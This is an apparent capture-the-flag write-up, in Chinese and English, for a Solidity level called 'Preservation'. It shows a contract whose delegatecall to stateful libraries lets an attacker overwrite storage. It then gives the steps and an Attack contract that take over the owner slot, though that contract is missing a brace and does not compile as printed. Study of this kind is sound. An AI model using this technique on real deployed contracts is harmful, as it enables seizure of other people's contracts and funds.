# Preservation

> This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.
>
> The goal of this level is for you to claim ownership of the instance you are given.

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

## 攻击思路

Preservation 合约使用 delegatecall 时只会使用 LibraryContract合约的代码逻辑，不会也不能修改 LibraryContract合约的变量。LibraryContract合约寻找变量时会按照 LibraryContract合约变量所在的插槽寻找 Preservation合约对应插槽中的变量。

## 攻击流程

首先调用 Preservation合约 的 setFirstTime函数，函数参数为： Attack合约的地址。此时，Preservation合约中的timeZone1Library变量就修改为了Attack合约的地址。然后再调用 Preservation合约的 setFirstTime函数，函数参数为：我的账户地址。

```solidity
contract Attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    function setTime(uint _time) public 
       owner = address(_time);
    }
}

```

As the previous level, `delegate` mentions, the use of `delegatecall` to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the `library` keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.